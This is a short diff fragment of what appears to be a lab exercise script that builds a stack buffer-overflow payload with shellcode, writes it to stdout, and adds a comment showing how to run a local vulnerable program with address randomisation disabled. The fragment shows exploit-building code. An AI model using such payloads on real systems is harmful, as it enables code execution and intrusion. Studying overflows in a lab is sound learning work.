@@ -33,3 +33,5 @@ payload += shellcode
 # Write to stdout
 sys.stdout.buffer.write(payload)
 #So buffer is being overflowed and eip is the desired address after seg fault
+
+#setarch $(uname -m) -R ./vuln_program < shell_string.txt
